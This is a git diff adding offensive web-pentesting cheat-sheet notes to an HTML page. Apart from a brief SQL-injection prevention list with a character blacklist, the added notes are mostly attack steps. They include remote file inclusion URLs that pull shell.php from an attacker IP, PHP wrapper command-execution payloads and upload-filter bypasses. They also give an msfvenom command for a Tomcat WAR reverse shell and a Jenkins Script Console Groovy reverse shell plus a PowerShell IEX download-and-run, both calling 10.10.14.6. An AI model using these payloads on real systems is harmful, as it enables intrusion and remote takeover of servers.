@@ -184,6 +184,13 @@ layout: default
 	<li>Preventing SQL injection</li>
 	<ul>
 		<li>Use parameterized queries, also known as prepared statements.  This puts parameters or placeholders into SQL statements.  The databased binds the values of the user input to the statement.  This prevents user input from manipulating SQL code.</li>
+		<li>Do not display errors on the webpage</li>
+		<li>Limit character length</li>
+		<li>Whitelist characters - only allow certain characters to be used</li>
+		<li>Blacklist characters - do not allow certain characters to be used</li>
+		<ul>
+			<li>Such as:  &ldquo;&lt;&gt;/?*()&amp;,SQL,SCRIPT,SELECT,INSERT,UPDATE,DROP,%0A,%0D,%00</li></li>
+		</ul>
 	</ul>
 
 	<table>
@@ -776,5 +783,321 @@ layout: default
 		<ul>
 			<li>Linux Log locations could be listed in /usr/local/etc/apache24/httpd.conf</li>
 			<li>Possible windows log location - c:\xampp\apache\logs\access.log</li>
+		</ul>
+	</ul>
+
+	<h2>RFI</h2>
+
+	<li>Remote file inclusion</li>
+	<ul>
+		<li>phpinfo - allow_url_include must be set to "On" for RFI to work</li>
+		<ul>
+			<li>Old versions had this on by default.  New versions have it off by default.</li>
+		</ul>
+	</ul>
+
+	<li>If RFI is found, get a webshell by accessing shell.php</li>
+	<ul>
+		<li>&lt;victim url&gt;/file=&lt;attacker ip&gt;/shell.php</li>
+	</ul>
+
+	<li>Windows</li>
+	<ul>
+		<li>Identify RFI</li>
+		<table>
+			<tr>
+				<td>Test RFI using SMB</td>
+				<td>&lt;url&gt;/?something=\\&lt;attacker ip&gt;\test.txt</td>
+			</tr>
+			<tr>
+				<td>Listen on port 445</td>
+				<td>nc -lvnp 445</td>
+			</tr>
+		</table>
+
+		<li>Try to extract a hash</li>
+		<ul>
+			<table>
+				<tr>
+					<td>Listen for SMB</td>
+					<td>responder -I tun0</td>
+				</tr>
+				<tr>
+					<td>Watch traffic on 445</td>
+					<td>tcpdump -i tun0 port 445</td>
+				</tr>
+			</table>
+
+			<li>If traffic shows on 445 when attempting the RFI but nothing shows in responder then the server is not vulernable to this attack</li>
+		</ul>
+		<li>Try setting up SMB Server on attacker and attempt to use RFI to access these files</li>
+		<ul>
+			<li>RFI &lt;url&gt;/&lt;smb share&gt;/shell.php&amp;cmd=whoami</li>
+			<li>Try impacket-smbserver</li>
+			<li>Try built in linux SMB Server</li>
+		</ul>
+	</ul>
+
+	<li>Linux</li>
+	<ul>
+		<li>Identify RFI</li>
+		<table>
+			<tr>
+				<td>Test for RFI</td>
+				<td>&lt;url&gt;/?file=http://&lt;attacker ip&gt;/test.txt</td>
+			</tr>
+			<tr>
+				<td>Listen for victim</td>
+				<td>nc -lnvp 80</td>
+			</tr>
+		</table>
+	</ul>
+
+	<h2>PHP Wrappers</h2>
+
+	<li>Examples:</li>
+	<table>
+		<tr>
+			<td>Example 1</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,hello world</td>
+		</tr>
+		<tr>
+			<td>Example 2</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;whoami&quot;) ?&gt;</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page code in base64</td>
+			<td>
+				<li>&lt;url&gt;/something=php://filter/convert.base64-encode/resource=&lt;php page&gt;</li>
+				<ul>
+					<li>Test index.php first</li>
+				</ul>
+			</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page by directory</td>
+			<td>&lt;url&gt;/something=php://filter/resource=&lt;php page&gt;</td>
+		</tr>
+	</table>
+
+	<h2>phpinfo.php</h2>
+
+	<table>
+		<tr>
+			<td>allow_url_include = on</td>
+			<td>RFI vulnerability</td>
+		</tr>
+		<tr>
+			<td>file_uploads=on + LFI</td>
+			<td>
+				<li>RCE</li>
+				<ul>
+					<li>https://www.insomniasec.com/downloads/publications/phpinfolfi.py</li>
+					<li>HackTheBox - Poison - https://youtu.be/rs4zEwONzzk?t=601</li>
+				</ul>
+			</td>
+		</tr>
+		<tr>
+			<td>$_SERVER['DOCUMENT_ROOT']</td>
+			<td>Directory of web server files</td>
+		</tr>
+	</table>
+
+	<h2>Upload Restriction Bypass</h2>
+
+	<li>Try uploading with different extensions & file types</li>
+	
+	<li>Try double extensions</li>
+	<ul>
+		<li>.php.gif</li>
+		<li>.gif.php</li>
+	</ul>
+
+	<li>Magic bytes</li>
+	<ul>
+		<li>Bytes at the beginning of a file that indicate which type of file it is, on the byte level</li>
+		<li>Add magic byte from image file to beginning of shell file</li>
+		<li>Get magic bytes from .jpg file</li>
+		<ul>
+			<li>head &lt;file&gt; | xxd</li>
+			<ul>
+				<li>Output file bytes, first few should be the magic bytes</li>
+			</ul>
+			<li>head -c&lt;#&gt; &lt;file&gt; | xxd</li>
+			<ul>
+				<li>Output number of bytes from file and display in readable format</li>
+			</ul>
+		</ul>
+		<li>Add magic bytes using hexeditor</li>
+		<li>Null byte vulnerability (%00)</li>
+		<ul>
+			<li>Terminate strings using null byte to bypass file extensions that are appended by the server</li>
+			<li>Only works on old versions of php</li>
+		</ul>
+	</ul>
+
+	<h2>Web Servers & OS Combos</h2>
+
+	<li>Apache on Windows</li>
+	<ul>
+		<li>Not the typical Windows web server</li>
+		<li>Typically used alongside XAMPP</li>
+		<ul>
+			<li>File would be placed in C:\xampp\htdocs</li>
+		</ul>
+		<li>Usually using .php</li>
+	</ul>
+
+	<li>IIS on Windows</li>
+	<ul>
+		<li>Typical Windows web server</li>
+		<li>Files placed in C:\inetpub\htdocs</li>
+		<li>Usually using .asp and/or .aspx</li>
+	</ul>
+
+	<li>nginx</li>
+	<ul>
+		<li>Typically not running PHP, but it is possible</li>
+	</ul>
+
+	<h2>Tomcat</h2>
+
+	<li>Provides a way of running java applications (.WAR files)</li>
+	<li>Tomcat proxy that gives localhost access to the machine</li>
+	<ul>
+		<li>AJP / port 8009</li>
+	</ul>
+
+	<li>Default creds list - /seclists/passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt</li>
+	<li>File with login creds - /tomcat/conf/tomcat-users.xml</li>
+
+	<li>manager webapp</li>
+	<ul>
+		<li>&lt;ip address&gt;:8080/manager/text/deploy</li>
+		<li>Deploy .war shell for RCE</li>
+		<ul>
+			<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war</li>
+		</ul>
+	</ul>
+
+	<h2>Wordpress</h2>
+
+	<li>Exploitation</li>
+	<ul>
+		<li>Login as admin, edit theme or upload malicious plugin</li>
+		<li>Look for vulnerable plugins</li>
+		<li>Write web shell code to any page we have write access to</li>
+		<ul>
+			<li>Check for writable pages under themes section</li>
+		</ul>
+	</ul>
+
+	<li>Tools</li>
+	<ul>
+		<li>Vane</li>
+		<ul>
+			<li>Free version of wpscan</li>
+		</ul>
+		<li>wpscan</li>
+		<ul>
+			<li>Flags</li>
+			<table>
+				<tr>
+					<td>ap</td>
+					<td>All plugins</td>
+				</tr>
+				<tr>
+					<td>at</td>
+					<td>All Themes</td>
+				</tr>
+				<tr>
+					<td>cb</td>
+					<td>Config Backups</td>
+				</tr>
+				<tr>
+					<td>dbe</td>
+					<td>Database Exports</td>
+				</tr>
+				<tr>
+					<td>u</td>
+					<td>usernames</td>
+				</tr>
+			</table>
+		</ul>
+	</ul>
+
+	<li>Check for credentials saved in plugins</li>
+	<ul>
+		<li>Example: Easy WP SMTP</li>
+		<ul>
+			<li>Plugins > Settings on Easy WP SMTP plugin</li>
+			<ul>
+				<li>Username and password should be saved</li>
+				<ul>
+					<li>Right click and view source to view censored password field</li>
+				</ul>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>WP login page</li>
+	<ul>
+		<li>website.com/wp-login.php</li>
+	</ul>
+
+	<li>Manually Enumerating WordPress</li>
+	<ul>
+		<li>Tools > Site Health > Info > Server & Database</li>
+		<ul>
+			<li>Server running WordPress</li>
+			<li>PHP Version</li>
+			<li>Database host IP</li>
+		</ul>
+	</ul>
+
+	<h2>Jenkins</h2>
+
+	<li>RCE if authenticated</li>
+	<ul>
+		<li>Go to "Script Console" and execute the below for a reverse shell</li>
+		<table>
+			<tr>
+				<td>Method 1</td>
+				<td>
+					<pre>
+						String host="10.10.14.6";
+						int port=4444;
+						String cmd="cmd.exe";
+						Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+					</pre>
+				</td>
+			</tr>
+			<tr>
+				<td>Method 2</td>
+				<td>
+					<pre>
+						cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/shell.ps1')" """
+						println cmd.execute().text
+					</pre>
+				</td>
+			</tr>
+		</table>
+
+		<li>Create new "Freestyle" project</li>
+		<ul>
+			<li>Noisier, people can see new project being created</li>
+			<li>Build > Add Build Step</li>
+			<ul>
+				<li>Enter command to execute in pop-out box</li>
+			</ul>
+		</ul>
+	</ul>
+
+	<h2>Sharepoint</h2>
+
+	<li>Enumeration</li><ul>
+		<li>/usr/share/wordlists/seclists/discovery/web_content/sharepoint.txt</li>
+		<li>&lt;url&gt;/_layouts/viewlsts.aspx</li><ul>
+			<li>Shows different libraries</li>
 		</ul>
 	</ul>
